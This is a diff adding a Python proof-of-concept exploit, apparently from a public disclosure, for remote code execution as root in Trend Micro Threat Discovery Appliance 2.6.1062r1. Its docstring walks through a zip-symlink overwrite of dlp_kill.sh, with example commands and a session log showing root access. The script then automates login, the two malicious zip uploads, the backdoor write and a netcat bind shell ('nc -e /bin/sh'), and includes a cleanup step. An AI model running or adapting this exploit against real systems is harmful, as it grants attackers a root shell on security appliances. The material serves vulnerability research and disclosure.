@@ -1,0 +1,263 @@
+#!/usr/local/bin/python
+"""
+Trend Micro Threat Discovery Appliance <= 2.6.1062r1 dlp_policy_upload.cgi Remote Code Execution Vulnerability
+Found by: Steven Seeley of Source Incite & Roberto Suggi Liverani - @malerisch - http://blog.malerisch.net/ 
+File: TDA_InstallationCD.2.6.1062r1.en_US.iso
+sha1: 8da4604c92a944ba8f7744641bce932df008f9f9
+Download: http://downloadcenter.trendmicro.com/index.php?regs=NABU&clk=latest&clkval=1787&lang_loc=1
+
+Summary:
+========
+
+The vulnerabity is that the dlp_policy_upload.cgi allows the upload of a zip file, located statically as: /var/dlp_policy.zip.
+The problem is that we can then get that file extracted using admin_dlp.cgi. This gets extracted into 2 locations:
+
+- /eng_ptn_stores/prod/sensorSDK/data/
+- /eng_ptn_stores/prod/sensorSDK/backup_pol/
+
+We can then use symlinks to craft a symlinked that points to /opt/TrendMicro/MinorityReport/bin/
+
+ls -la /eng_ptn_stores/prod/sensorSDK/data/si
+lrwxrwxrwx    1 root     root           35 Sep  3 01:22 /eng_ptn_stores/prod/sensorSDK/data/si -> /opt/TrendMicro/MinorityReport/bin/
+
+Then, all we do is create /eng_ptn_stores/prod/sensorSDK/data/si/dlp_kill.sh with malicious code and get it executed...
+
+Notes:
+======
+
+- For this particular PoC, all I did was exec a bind shell using netcat showing that there is no firewall protections...
+- Auth is bypassed in an alternate poc, so we can attack this with the default password...
+
+Exploitation
+============
+
+This is a clever trick, basically, we cant traverse since unzip checks for ../ (even though spec says its ok).
+We can still exploit this however by extracting a symlink to say a directory and then write into that directory.
+
+For example, if you wanted to link to /tmp you would
+
+ln -s /tmp/ pwn
+zip --symlinks -r foo.zip pwn 
+
+Now foo.zip contains the symlink to /tmp. Once this is extracted, the symlink will be written to disk.
+All we need todo now is create another zip file with the folder and file...
+
+zip -r foo.zip pwn/hax.txt
+
+Now after extracting foo.zip, we will write hax.txt into /tmp. Of course, we can automate this magic via python.
+
+So, in summary, the steps to attack this target are:
+
+1. Bypass the auth via XXXX
+2. upload a zip with a symlink 
+3. trigger extraction, crafting the malicious symlink
+4. upload another zip with the malicious dlp_kill.sh file
+5. trigger extraction, the symlink fires and crushs /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh
+6. trigger the execution of /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh via admin_dlp.cgi
+
+Greetz to the busticati, you know who you are. My home boys.
+
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <pass>
+(+) eg: ./poc.py 172.16.175.123 admin
+saturn:~ mr_me$ ./poc.py 172.16.175.123 admin123
+(+) logged into the target...
+(+) performing initial preflight attack...!
+(+) uploading the zipped symlink...
+(+) successfuly uploaded the zipped symlink
+(+) extracting the symlink...
+(+) extracted the symlink!
+(+) uploading the zipped dlp_kill.sh...
+(+) successfuly uploaded the zipped log_cache.sh
+(+) extracting the dlp_kill.sh to /opt/TrendMicro/MinorityReport/bin/...
+(+) extracted the dlp_kill.sh file!
+(+) starting backdoor...
+(+) backdoor started !
+(+) dont forget to clean /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh !
+(+) run: sed -i '$ d' /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh
+id
+uid=0(root) gid=0(root)
+uname -a
+Linux localhost 2.6.24.4 #1 SMP Wed Oct 13 14:38:44 CST 2010 i686 unknown
+cat /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh
+#!/bin/sh
+
+kill `pidof sensorworker sensormain`
+for i in `seq 0 4`;
+do
+    sleep 1;
+    sid=`pidof sensormain`
+    if [ "$sid" -eq "" ]; then
+        break
+    else
+        if [ $i -eq 4 ]; then
+            kill -9 $sid
+        fi
+    fi
+done
+`nc -e /bin/sh -lp 2122>/dev/null`
+sed -i '$ d' /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh
+cat /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh
+#!/bin/sh
+
+kill `pidof sensorworker sensormain`
+for i in `seq 0 4`;
+do
+    sleep 1;
+    sid=`pidof sensormain`
+    if [ "$sid" -eq "" ]; then
+        break
+    else
+        if [ $i -eq 4 ]; then
+            kill -9 $sid
+        fi
+    fi
+done
+exit
+
+Cleanup:
+========
+
+We just use "sed -i '$ d' /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh" to remove the last line
+of the script (the backdoor).
+"""
+import os
+import sys
+import time
+import zipfile
+import requests
+import threading
+from cStringIO import StringIO
+
+requests.packages.urllib3.disable_warnings()
+
+def _get_bd():
+    bd = """#!/bin/sh
+
+kill `pidof sensorworker sensormain`
+for i in `seq 0 4`;
+do
+    sleep 1;
+    sid=`pidof sensormain`
+    if [ "$sid" -eq "" ]; then
+        break
+    else
+        if [ $i -eq 4 ]; then
+            kill -9 $sid
+        fi
+    fi
+done
+`%s>/dev/null`
+""" % c
+    return bd
+
+def _build_zip(CREATE_SYMLINK=False):
+    """
+    builds the zip file using a symlink attack into a folder...
+    so we symlink the /opt/TrendMicro/MinorityReport/bin/ directory
+    and then crush the dlp_kill.sh only to then later get it executed
+    resulting in rce as root.
+    """
+    if CREATE_SYMLINK:
+        zipinfo = zipfile.ZipInfo()
+        zipinfo.filename = u'si'
+        zipinfo.external_attr |= 0120000 << 16L         # symlink file type
+        zipinfo.compress_type = zipfile.ZIP_STORED
+    f = StringIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    if CREATE_SYMLINK:
+        z.writestr(zipinfo, "/opt/TrendMicro/MinorityReport/bin/")
+    else:
+        zipinfo = zipfile.ZipInfo("si/dlp_kill.sh")
+        zipinfo.external_attr = 0777 << 16L # give full access to included filezipinfo
+
+        # backdooring code, as we do
+        z.writestr(zipinfo, _get_bd())
+    z.close()
+    test = open('hax.zip','wb')
+    test.write(f.getvalue())
+    test.close()
+    return f.getvalue()
+
+def we_can_upload_a_zip(CREATE_SYMLINK=False):
+    """
+    uploads a zip file with php code inside to our target for exploitation
+    """
+    multiple_files = {
+        'Q_UPLOAD_ID': (None, ''),
+        'binary1': ('pwn.zip', _build_zip(CREATE_SYMLINK), 'application/zip'),
+        'submit': (None, 'Import')   
+    }
+    r = s.post(upload_url, files=multiple_files, verify=False)
+    if r.status_code == 200:
+        return True
+    return False
+
+def unzip():
+    try:
+        r = s.post(unzip_url, data={"act":"save","upload_status":"0"}, verify=False)
+    except:
+        pass
+    return True
+
+def we_can_login():
+    r = s.post(login_url, data={ "passwd":p, "isCookieEnable":1 }, verify=False)
+    if "frame.cgi" in r.text:
+        return True
+    return False
+
+def main():
+    global c, s, t, p, login_url, unzip_url, upload_url
+    if len(sys.argv) != 3:
+        print "(+) usage: %s <target> <pass>" % sys.argv[0]
+        print "(+) eg: %s 172.16.175.123 admin" % sys.argv[0]
+        sys.exit(-1)
+    t = sys.argv[1]
+    p = sys.argv[2]
+    bu = "https://%s/" % t
+    login_url  = "%scgi-bin/logon.cgi" % bu
+    unzip_url  = "%scgi-bin/admin_dlp.cgi" % bu
+    upload_url = "%scgi-bin/dlp_policy_upload.cgi" % bu
+    s = requests.Session()
+
+    # 1st we bypass auth and login
+    if we_can_login():
+
+        # we just use a bind, demonstrating that the target doesnt even have a proper firewall!
+        c = "nc -e /bin/sh -lp 2122"
+        print "(+) logged into the target..."
+        print "(+) performing initial preflight attack...!"
+        print "(+) uploading the zipped symlink..."
+
+        # 2nd we upload symlink attack
+        if we_can_upload_a_zip(CREATE_SYMLINK=True):
+            print "(+) successfuly uploaded the zipped symlink"
+            print "(+) extracting the symlink..."
+
+            # 3rd we extract it
+            unzip()
+            print "(+) extracted the symlink!"
+            time.sleep(2)   # let the server process things
+            print "(+) uploading the zipped dlp_kill.sh..."
+
+            # 4th we upload the backdoor
+            if we_can_upload_a_zip(CREATE_SYMLINK=False):
+                print "(+) successfuly uploaded the zipped log_cache.sh"
+                print "(+) extracting the dlp_kill.sh to /opt/TrendMicro/MinorityReport/bin/..."
+
+                # 5th extract the backdoor, crushing /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh
+                unzip()
+                print "(+) extracted the dlp_kill.sh file!"
+                print "(+) starting backdoor..."
+
+                # 6th we trigger the exec of /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh
+                thread = threading.Thread(target=unzip, args=())
+                thread.daemon = True
+                thread.start()
+                print "(+) backdoor started !"
+                print "(+) dont forget to clean /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh !"
+                print "(+) run: sed -i '$ d' /opt/TrendMicro/MinorityReport/bin/dlp_kill.sh"
+                time.sleep(2)
+                os.system("nc %s 2122" % t)
+if __name__ == '__main__':
+    main()
